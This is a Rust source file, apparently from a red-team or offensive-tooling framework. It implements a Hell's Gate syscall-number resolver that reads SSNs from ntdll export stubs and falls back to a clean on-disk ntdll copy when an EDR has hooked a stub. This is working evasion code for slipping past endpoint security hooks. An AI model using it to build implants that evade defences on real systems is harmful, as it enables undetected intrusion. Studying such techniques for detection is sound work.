//! Hell's Gate SSN resolver: reads each SSN from the live `Nt*` export
//!
//! Operator reference: `README.md` (rendered into
//! `docs/features/ref/syscalls/hells_gate.md`).

use crate::techniques::Stability;

use super::ResolverDef;

pub const DEF: ResolverDef = ResolverDef {
    name: "hells_gate",
    phase: "6a",
    attck: &["T1106"],
    stability: Stability::Stable,
    doc_path: "src/engine/syscalls/resolvers/hells_gate/README.md",
    readme: include_str!("README.md"),
};

/// Hell's Gate resolver: reads SSNs out of the live ntdll export stubs, with a
/// per-function fallback to a clean on-disk copy when a prologue is hooked.
/// `$SSN_INIT$` / `$SSN_RESOLVE$` / `$NTDLL_DEF$` / `$FILE_PE_HELPERS$` are
/// filled by `resolvers::render_body`.
pub(crate) const FRAGMENT: &str = r#"    /// Hell's Gate: reads each SSN out of the Nt* stub prologue in ntdll.
    fn resolve_ssns() -> Result<(SsnTable, usize), SyscallError> {
        let ntdll =
            std::ffi::CString::new($NTDLL_DEF$).map_err(|_| SyscallError::NtdllNotFound)?;
        let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
            .map_err(|_| SyscallError::NtdllNotFound)?;

        let mut table = SsnTable {
$SSN_INIT$
        };
$SSN_RESOLVE$

        let gadget = find_gadget(module)?;
        Ok((table, gadget))
    }

    /// Resolves one function and reads its SSN from the stub prologue.
    fn resolve_ssn(module: HMODULE, name: &str) -> Result<u32, SyscallError> {
        let cname = std::ffi::CString::new(name)
            .map_err(|_| SyscallError::FunctionNotFound(name.to_string()))?;
        let address = unsafe { GetProcAddress(module, PCSTR(cname.as_ptr() as *const u8)) };
        let Some(address) = address else {
            return Err(SyscallError::FunctionNotFound(name.to_string()));
        };
        let prologue = unsafe { std::slice::from_raw_parts(address as *const u8, 8) };
        match parse_ssn(prologue) {
            Some(ssn) => {
                crate::tech_dbg!("syscalls", "{name} -> SSN {ssn}");
                Ok(ssn)
            }
            None => {
                crate::tech_dbg!(
                    "syscalls",
                    "{name}: export prologue is not in the expected form"
                );
                Err(SyscallError::PatternMismatch(name.to_string()))
            }
        }
    }

    /// Resolves an SSN from the live stub and, when the live prologue is not
    /// canonical (an EDR hooked it), falls back per function to the clean
    /// on-disk copy — Hell's Gate with Tartarus Gate's safety net, so one hook
    /// does not fail the whole table.
    fn resolve_ssn_with_fallback(module: HMODULE, name: &str) -> Result<u32, SyscallError> {
        match resolve_ssn(module, name) {
            Ok(ssn) => Ok(ssn),
            Err(SyscallError::PatternMismatch(_)) => {
                let file = read_clean_ntdll(&$NTDLL_DEF$)?;
                resolve_ssn_from_file(&file, name)
            }
            Err(other) => Err(other),
        }
    }

    /// Reads an SSN from a clean on-disk copy of ntdll (the fallback path), the
    /// same walk Tartarus Gate uses.
    fn resolve_ssn_from_file(file: &[u8], name: &str) -> Result<u32, SyscallError> {
        let rva = export_rva(file, name)
            .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
        let offset = rva_to_offset(file, rva as usize)
            .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
        let Some(end) = offset.checked_add(8) else {
            return Err(SyscallError::FunctionNotFound(name.to_string()));
        };
        let prologue = file
            .get(offset..end)
            .ok_or_else(|| SyscallError::FunctionNotFound(name.to_string()))?;
        parse_ssn(prologue).ok_or_else(|| SyscallError::PatternMismatch(name.to_string()))
    }

$FILE_PE_HELPERS$
"#;
